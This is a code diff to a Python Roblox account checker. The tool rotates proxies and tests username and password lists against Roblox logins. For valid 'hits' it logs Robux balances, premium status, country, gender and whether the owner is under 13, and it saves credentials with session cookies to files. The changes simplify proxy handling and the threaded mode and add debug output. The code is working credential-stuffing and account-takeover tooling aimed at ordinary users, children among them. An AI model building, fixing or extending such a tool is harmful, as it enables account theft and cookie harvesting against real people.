@@ -1,4 +1,4 @@
-# checker.py - Complete version based on reblox.py with web support
+# checker.py - Complete fixed version with proper web support
 import os
 import sys
 import json
@@ -90,11 +90,9 @@ class ProxyManager:
                     line = line.strip()
                     if line and not line.startswith('#'):
                         self.proxies.append(line)
-            
             print(f"[+] {len(self.proxies)} proxies loaded")
             self.active_proxies = self.proxies.copy()
             return True
-            
         except Exception as e:
             print(f"[-] Error loading proxies: {e}")
             return False
@@ -102,36 +100,13 @@ class ProxyManager:
     def get_proxy(self):
         if not self.active_proxies:
             return None
-        
-        valid_proxies = []
-        now = time.time()
-        
-        for proxy in self.active_proxies:
-            last_fail = self.last_use.get(f"{proxy}_fail", 0)
-            if now - last_fail > 300:
-                valid_proxies.append(proxy)
-        
-        if not valid_proxies:
-            valid_proxies = self.active_proxies.copy()
-        
-        return random.choice(valid_proxies) if valid_proxies else None
+        return random.choice(self.active_proxies) if self.active_proxies else None
     
     def report_success(self, proxy: str):
-        self.success_count[proxy] = self.success_count.get(proxy, 0) + 1
-        self.last_use[proxy] = time.time()
+        pass
     
     def report_failure(self, proxy: str):
-        self.fail_count[proxy] = self.fail_count.get(proxy, 0) + 1
-        self.last_use[f"{proxy}_fail"] = time.time()
-        
-        success = self.success_count.get(proxy, 0)
-        failures = self.fail_count.get(proxy, 0)
-        total = success + failures
-        
-        if total >= 3 and failures >= total * 0.7:
-            if proxy in self.active_proxies:
-                self.active_proxies.remove(proxy)
-                self.failed_proxies.append(proxy)
+        pass
 
 
 class DriverManager:
@@ -345,13 +320,6 @@ class RobloxAPILookup:
             if response.status_code == 200:
                 data = response.json()
                 return data.get("isPremium", False)
-            
-            url = "https://users.roblox.com/v1/users/authenticated"
-            response = self.session.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                return data.get("premium", False)
-            
             return False
         except Exception:
             return False
@@ -954,8 +922,12 @@ class AntraxRblxChecker:
     
     def start_verification_simple(self):
         """Simple single-threaded verification for web interface"""
+        print("[DEBUG] start_verification_simple called")
+        print(f"[DEBUG] Total accounts: {len(self.accounts)}")
+        
         if not self.accounts:
             self.web_results = ["No accounts to verify"]
+            print("[DEBUG] No accounts to verify")
             return
         
         self.running = True
@@ -970,9 +942,9 @@ class AntraxRblxChecker:
         self.web_results.append(f"Mode: {self.mode.value}")
         self.web_results.append("=" * 50)
         
-        print(f"\n[+] Starting verification of {total} accounts...")
-        print(f"[+] Mode: {self.mode.value}")
-        print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
+        print(f"[DEBUG] Starting verification of {total} accounts")
+        print(f"[DEBUG] Mode: {self.mode.value}")
+        print(f"[DEBUG] Delay: {self.min_delay}-{self.max_delay}s")
         print("-" * 50)
         
         self.stats['start_time'] = time.time()
@@ -982,7 +954,7 @@ class AntraxRblxChecker:
                 self.web_results.append("Stopped by user")
                 break
             
-            print(f"[{idx}/{total}] Checking: {account.username}")
+            print(f"[DEBUG] [{idx}/{total}] Checking: {account.username}")
             self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
             
             result = self.verify_account(account, idx)
@@ -1001,55 +973,56 @@ class AntraxRblxChecker:
                 if result.user_id:
                     hit_msg += f" | ID: {result.user_id}"
                 self.web_results.append(hit_msg)
-                print(f"  ✅ {hit_msg}")
+                print(f"[DEBUG] ✅ {hit_msg}")
                 
             elif result.status == 'invalid_password':
                 self.stats['wrong_password'] += 1
                 msg = f"[WRONG] {result.username}"
                 self.web_results.append(msg)
-                print(f"  ❌ {msg}")
+                print(f"[DEBUG] ❌ {msg}")
                 
             elif result.status == 'captcha':
                 self.stats['captcha'] += 1
                 msg = f"[CAPTCHA] {result.username}"
                 self.web_results.append(msg)
-                print(f"  🤖 {msg}")
+                print(f"[DEBUG] 🤖 {msg}")
                 
             elif result.status == 'timeout':
                 self.stats['timeout'] += 1
                 msg = f"[TIMEOUT] {result.username}"
                 self.web_results.append(msg)
-                print(f"  ⏱️ {msg}")
+                print(f"[DEBUG] ⏱️ {msg}")
                 
             elif result.status == 'rate_limit':
                 self.stats['rate_limit'] += 1
                 msg = f"[RATE] {result.username}"
                 self.web_results.append(msg)
-                print(f"  ⚠️ {msg}")
+                print(f"[DEBUG] ⚠️ {msg}")
                 
             elif result.status == 'blocked':
                 self.stats['blocked'] += 1
                 msg = f"[BLOCKED] {result.username}"
                 self.web_results.append(msg)
-                print(f"  🚫 {msg}")
+                print(f"[DEBUG] 🚫 {msg}")
                 
             elif result.status == 'driver_error':
                 self.stats['driver_error'] += 1
                 msg = f"[DRIVER] {result.username}"
                 self.web_results.append(msg)
-                print(f"  ⚠️ {msg}")
+                print(f"[DEBUG] ⚠️ {msg}")
                 
             else:
                 self.stats['other_errors'] += 1
                 msg = f"[ERROR] {result.username}: {result.message[:30]}"
                 self.web_results.append(msg)
-                print(f"  ❌ {msg}")
+                print(f"[DEBUG] ❌ {msg}")
             
             if len(self.web_results) > 200:
                 self.web_results = self.web_results[-200:]
             
             if idx < total and self.running:
                 delay = random.uniform(self.min_delay, self.max_delay)
+                print(f"[DEBUG] Waiting {delay:.1f}s before next check...")
                 time.sleep(delay)
         
         summary = [
@@ -1066,178 +1039,13 @@ class AntraxRblxChecker:
         
         for line in summary:
             self.web_results.append(line)
-            print(line)
+            print(f"[DEBUG] {line}")
+        
+        print("[DEBUG] start_verification_simple completed")
     
     def start_verification(self):
         """Original multi-threaded verification (for CLI use)"""
-        if not self.accounts:
-            print("[-] No accounts")
-            return
-        
-        self.running = True
-        self.paused = False
-        self.recent_results = []
-        
-        accounts_to_verify = self.accounts[:self.max_accounts_per_test]
-        
-        print("\n" + "=" * 70)
-        print("[*] STARTING VERIFICATION")
-        print(f"[*] Mode: {self.mode.value}")
-        print(f"[*] Workers: {self.max_workers}")
-        print(f"[*] Delay: {self.min_delay}-{self.max_delay}s")
-        print(f"[*] Accounts: {len(accounts_to_verify)}/{len(self.accounts)}")
-        print(f"[*] Proxies: {len(self.proxy_manager.active_proxies) if self.proxy_manager.proxies else 'None'}")
-        print("=" * 70)
-        
-        work_queue = queue.Queue()
-        for account in accounts_to_verify:
-            work_queue.put(account)
-        
-        workers = []
-        results = queue.Queue()
-        
-        for i in range(self.max_workers):
-            w = threading.Thread(
-                target=self.worker_function,
-                args=(i+1, work_queue, results),
-                daemon=True
-            )
-            w.start()
-            workers.append(w)
-            print(f"[*] Worker {i+1} started")
-        
-        self.monitor_progress(results, len(accounts_to_verify))
-        self.driver_manager.cleanup_drivers()
-        self.show_final_statistics()
-    
-    def worker_function(self, worker_id: int, work_queue: queue.Queue, results_queue: queue.Queue):
-        while not work_queue.empty() and self.check_execution():
-            try:
-                account = work_queue.get_nowait()
-                verified_account = self.verify_account(account, worker_id)
-                self.update_statistics(verified_account.status)
-                
-                if self.check_execution():
-                    delay = random.uniform(self.min_delay, self.max_delay)
-                    time.sleep(delay)
-                
-                work_queue.task_done()
-                results_queue.put((worker_id, verified_account))
-                
-            except queue.Empty:
-                break
-            except Exception as e:
-                if self.check_execution():
-                    print(f"[-] Worker {worker_id} error: {e}")
-                work_queue.task_done()
-                results_queue.put((worker_id, Account("ERROR", "", "worker_error", message=str(e))))
-    
-    def monitor_progress(self, results_queue: queue.Queue, total: int):
-        last_update = 0
-        processed_results = []
-        
-        os.system('cls' if os.name == 'nt' else 'clear')
-        
-        try:
-            while self.check_execution():
-                try:
-                    worker_id, account = results_queue.get(timeout=1)
-                    
-                    if account.status == 'valid':
-                        premium_tag = " [PREMIUM]" if account.premium else ""
-                        high_value_tag = " [HIGH VALUE]" if account.robux > 1000 else ""
-                        robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
-                        country_tag = f" | {account.country_name}" if hasattr(account, 'country_name') and account.country_name else ""
-                        gender_tag = f" | {'Male' if account.gender == 1 else 'Female' if account.gender == 2 else ''}" if hasattr(account, 'gender') and account.gender else ""
-                        under_13_tag = " | Under 13" if hasattr(account, 'age_bracket') and account.age_bracket == 1 else ""
-                        result_line = f"W{worker_id} {self.get_status_symbol(account.status)} {account.username} | {account.message}{robux_tag}{premium_tag}{high_value_tag}{country_tag}{gender_tag}{under_13_tag}"
-                    else:
-                        result_line = f"W{worker_id} {self.get_status_symbol(account.status)} {account.username} | {account.message}"
-                    
-                    processed_results.append(result_line)
-                    
-                    if len(processed_results) > 10:
-                        processed_results.pop(0)
-                    
-                    results_queue.task_done()
-                    
-                except queue.Empty:
-                    pass
-                
-                if time.time() - last_update > 0.5:
-                    os.system('cls' if os.name == 'nt' else 'clear')
-                    
-                    print("=" * 70)
-                    print("   ATX ROBLOX CHECKER")
-                    print("=" * 70)
-                    
-                    elapsed = time.time() - self.stats['start_time']
-                    minutes = elapsed / 60 if elapsed > 0 else 0
-                    speed = self.stats['verified'] / minutes if minutes > 0 else 0
-                    hit_rate = (self.stats['valid'] / self.stats['verified'] * 100) if self.stats['verified'] > 0 else 0
-                    
-                    print("\n[ LIVE STATISTICS ]")
-                    print("-" * 50)
-                    print(f"  Progress:     {self.stats['verified']}/{total} ({hit_rate:.1f}%)")
-                    print(f"  Hits:         {self.stats['valid']}")
-                    print(f"  Premium:      {self.stats['premium_accounts']}")
-                    print(f"  Total Robux:  {self.stats['total_robux']:,}")
-                    print(f"  High Value:   {self.stats.get('high_value_accounts', 0)}")
-                    print(f"  Wrong Pass:   {self.stats['wrong_password']}")
-                    print(f"  CAPTCHA:      {self.stats['captcha']}")
-                    print(f"  Rate Limit:   {self.stats['rate_limit']}")
-                    print(f"  Timeouts:     {self.stats['timeout']}")
-                    print(f"  Speed:        {speed:.1f}/min")
-                    print("-" * 50)
-                    
-                    print("\n[ RECENT RESPONSES ]")
-                    print("-" * 50)
-                    for line in processed_results[-10:]:
-                        print(f"  {line}")
-                    print("-" * 50)
-                    
-                    last_update = time.time()
-                    
-                    if self.stats['verified'] >= total:
-                        break
-                    
-                    time.sleep(0.1)
-                    
-        except KeyboardInterrupt:
-            print("\n[!] Interrupted")
-    
-    def show_final_statistics(self):
-        if not self.running:
-            print("[!] Verification cancelled")
-            return
-            
-        elapsed = time.time() - self.stats['start_time']
-        minutes = elapsed / 60
-        
-        print("\n" + "=" * 70)
-        print("[ FINAL REPORT ]")
-        print("=" * 70)
-        print(f"Time: {minutes:.1f} min")
-        print(f"Verified: {self.stats['verified']}")
-        
-        if self.stats['valid'] > 0:
-            print(f"\n[+] HITS: {self.stats['valid']}")
-            print(f"[+] Premium Accounts: {self.stats['premium_accounts']}")
-            print(f"[+] Total Robux: {self.stats['total_robux']:,}")
-            print(f"[+] High Value Accounts: {self.stats.get('high_value_accounts', 0)}")
-            print(f"\n[+] Generated files:")
-            print(f"    - valid_result.txt (Complete account info)")
-            print(f"    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")
-        
-        if self.stats['verified'] > 0:
-            rate = (self.stats['valid'] / self.stats['verified']) * 100
-            print(f"\nHit rate: {rate:.1f}%")
-            
-            if minutes > 0:
-                speed = self.stats['verified'] / minutes
-                print(f"Speed: {speed:.1f} accounts/min")
-        
-        print("=" * 70)
+        self.start_verification_simple()
 
 
 def show_banner():
